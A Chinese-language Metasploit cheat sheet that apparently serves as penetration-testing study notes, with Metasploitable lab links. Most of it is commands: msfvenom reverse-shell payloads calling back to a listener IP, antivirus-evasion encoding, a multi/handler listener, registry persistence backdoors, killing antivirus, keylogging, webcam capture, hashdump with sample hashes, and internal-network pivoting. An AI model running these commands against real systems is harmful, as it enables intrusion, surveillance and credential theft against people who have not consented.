---
title: Metasploit漏洞利用框架
---

# 基本介绍

## Metasploit模块划分

MSF是渗透测试领域最流行的渗透测试框架，其中msf为总模块，其他均为分支模块。分支模块如下：

> 辅 助 模 块 (Auxiliary，扫描器)，扫描主机系统，寻找可用漏洞；
>
> 渗透攻击模块 (Exploits)，选择并配置一个漏洞利用模块；
>
> 攻击载荷模块 (Payloads)，选择并配置一个攻击载荷模块；
>
> 后渗透攻击模块 (Post)，用于内网渗透的各种操作；
>
> 编 码 器 模 块 (Encoders)，选择编码技术，绕过杀软（或其他免杀方式）；

 所有模块位置：`/usr/share/metasploit-framework/modules/` 

**渗透步骤（Exploit）**

```bash
search xxx		#搜索某个漏洞
use xxx			#使用某个漏洞利用模块
show options	#查看配置选项
set payload		#配置攻击载荷
exploit			#执行渗透攻击
```

## 参数摘要

```bash
reload_all		#从目录重载所有模块。导入模块也需要用到此命令。
back	#后退命令，移出当前上下文，用于模块切换
info	#目标和模块详细信息
check	#检查目标是否受某个漏洞影响

sessions		#会话管理
sessions -l		#列出所有会话
sessions -K		#终止所有会话
sessions -i id	#进入某个会话
sessions -v		#以详细模式列出会话
sessions -u		#在许多平台上将shell升级到meterpreter会话

show options	#显示可选选项
	 auxiliary	#显示所有辅助模块
	 exploits	#显示所有漏洞利用模块
	 payloads	#显示所有有效载荷
	 targets	#显示所有可用目标
	 advanced	#显示更多高级选项
	 encoders	#显示可用编码器列表
	 
unset [Module Options]    #清除Module Options
```
## 导入模块
模块的命名不能有-，可以用_代替。
reload_all		#从目录重载所有模块。导入模块也需要用到此命令。

# 使用辅助模块（Auxiliary）

### 端口扫描

```bash
use auxiliary/scanner/portmap/portmap_amp
use auxiliary/scanner/portscan/ftpbounce
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/portscan/ack
use auxiliary/scanner/portscan/syn
use auxiliary/scanner/portscan/xmas
```

### 服务扫描

```bash
auxiliary/scanner/ssh/ssh_login		#SSH爆破
auxiliary/scanner/vnc/vnc_none_auth	#VNC空口令扫描
auxiliary/scanner/telnet/telnet_login#SSH爆破
auxiliary/scanner/smb/smb_version	#SMB系统版本扫描
auxiliary/scanner/smb/smb_enumusers	#SMB枚举
auxiliary/scanner/smb/smb_login		#SMB弱口令登录
auxiliary/admin/smb/psexec_command	#登录SMB且执行命令

auxiliary/scanner/mssql/mssql_ping	#MSSQL主机信息扫描
auxiliary/admin/mssql/mssql_enum	#MSSQL枚举
auxiliary/scanner/mysql/mysql_login	#MySQL弱口令扫描
auxiliary/admin/mysql/mysql_enum	#MySQL枚举
```

# 攻击载荷和编码（Payloads && Encoders）

**MSF可以用以下方式，生成payload和编码**

```bash
use windows/meterpreter_reverse_http

-E   强制编码
-e   要使用的编码器模块的名称
-f   输出文件名（否则为stdout）
-t   输出格式: raw,ruby,rb,perl,pl,c,java,dll,exe,elf,vbs,asp,war等
-b   要避免的字符列表: '\x00\xff'
```

**但是我个人更喜欢用`msfvenom`生成`shellcode`然后编码免杀。**

**Windows**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=Kali监听端口 -f exe > msf.exe

参数选项：
-p			指定的payload
-e 			编码器，x86/shikata_ga_nai
-i			迭代器，对有效载荷的编码次数
-f			输出文件的格式,exe、dll、raw
```

**Linux**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=6666 -f elf > msf.elf
```
# 后渗透模块（Post）

```bash
run post/windows/gather/checkvm		#检查目标是否虚拟机
run post/linux/gather/checkvm
run post/windows/manage/killav		#关闭杀软
run post/windows/manage/enable_rdp	#开启目标远程桌面
run post/windows/gather/enum_logged_on_users	#列举当前登陆用户，和最近登陆过的用户
run post/windows/gather/enum_applications		#列举应用程序
run windows/gather/credentials/windows_autologin#列举自动登陆的用户名和密码
```

MSF官方后渗透模块参考：https://www.offensive-security.com/metasploit-unleashed/post-module-reference/ 

# 监听反弹shell

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp    #payload要和持久化所用模块的payload对应
msf5 exploit(multi/handler) > set LHOST 10.1.1.15
msf5 exploit(multi/handler) > set LPORT 6666
msf5 exploit(multi/handler) > run
```

# Meterpreter
## 持久化
 刚获得`Meterpreter Shell`时，该Shell是极其脆弱的，可以把它和目标机中一个稳定的程序绑定
 

 
```bash
getpid			#查看当前Meterpreter Shell的进程号
ps				#获取目标机正运行的进程
migrate 476		#将shell迁移到PID为786的进程中
```
## Persistence模块
```bash
run persistence -h    #查看persistence模块帮助信息、参数。
-X    #在目标系统启动时运行后门。此选项将在 Windows 注册表中添加一个条目，
      #使后门在系统启动时自动执行。
-i    #连接尝试的时间间隔
-p    #lhost的监听端口
-r    #remote.监听者IP。
-S    #在目标系统上以系统权限（SYSTEM）运行后门。但是实战中应用此参数报错，原因未知。

#举例
run persistence -X -i 10 -p 12397 -r 192.168.34.132    
#若监听时一直报错，换个监听端口即可。
[*] Started reverse TCP handler on 10.100.130.180:4444 
[-] Command shell session 1 is not valid and will be closed 
[*] 10.100.131.192 - Command shell session 1 closed. 
[-] Command shell session 2 is not valid and will be closed 
[*] 10.100.131.192 - Command shell session 2 closed. 
[-] Command shell session 3 is not valid and will be closed 
[*] 10.100.131.192 - Command shell session 3 closed.
```
关于注册表，有必要提一下HKLM。HKLM是 Windows 操作系统注册表中的一个根键，它代表了 HKEY_LOCAL_MACHINE，其中 "HKEY" 表示 "Handle to a Key"（键的句柄），而 "LOCAL_MACHINE" 表示本地计算机的配置信息。HKLM 包含了计算机的硬件和操作系统的配置信息、安装的软件信息、用户和组的安全设置等等。
## 命令摘要
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
 NT AUTHORITY\SYSTEM 這個帳號通常是隱藏的，就是傳說中的Windows至高無上權限帳號，跟Administrators擁有相同文件權限
 
```bash


pwd、ls、cd

getsystem	#获得系统管理员权限（要本地管理员权限运行）
sysinfo		#查看系统信息
idletim     #查看目标系统已运行时间
route		#查看目标机完整网络设置
shell		#进入目标机shell，exit退出she
background	#将meterpreter隐藏在后台

upload ./1.txt c:\\1.txt		#上传文件
download c:\1.txt ./			#下载文件
search -f *.txt -d c://			#搜索文件

keyscan_start	#启动键盘记录
keyscan_stop	#停止键盘记录
keyscan_dump	#转储键盘记录的内容
screenshot		#抓取截屏
webcam_list		#摄像头列表
webcam_snap		#摄像头拍照
webcam_stream	#抓取视频

#Kali-Linux下登录远程桌面
sudo rdesktop -f 目标IP

route add IP 子网掩码    #添加路由，先background
```
### Win密码
```bash
meterpreter > hashdump    #抓哈希密码，类型为NTLM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b9ae0589c85dd1deae5ecdc7e0d3e0e9:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:b9ae0589c85dd1deae5ecdc7e0d3e0e9:::
jiayuan:1000:aad3b435b51404eeaad3b435b51404ee:e399f145335ed1bd481bf2f030b355ad:::
```
第3列是密码md5值

# 网络穿透

**拿到反向shell之后，获取目标网络信息**

```bash
meterpreter > run get_local_subnets
```

 **使用`autoroute`模块添加路由** 

```bash
meterpreter > run autoroute -s 10.0.0.0/255.0.0.0
meterpreter > run autoroute -p		#列出添加了路由规则的存活session
```

 添加完成后返回上一层，这里一定要保证添加了路由规则的sessions的存活,如果sessions掉了对应的路由规则也就失效了

 添加完成后可以考虑使用ms17_010的扫描脚本进行目标内网的扫描

**端口转发** 
portfwd
# 插件
若要使用get shell提示音，可以使用 sounds plugin.
# MSF靶机

**Metasploitable2：**

下载地址：https://sourceforge.net/projects/metasploitable/ 

官方教程：https://metasploit.help.rapid7.com/docs/metasploitable-2 

**Metasploitable3**：

下载地址：https://github.com/rapid7/metasploitable3/

 视频教程演示：https://www.youtube.com/playlist?list=PLZOToVAK85MpnjpcVtNMwmCxMZRFaY6mT 

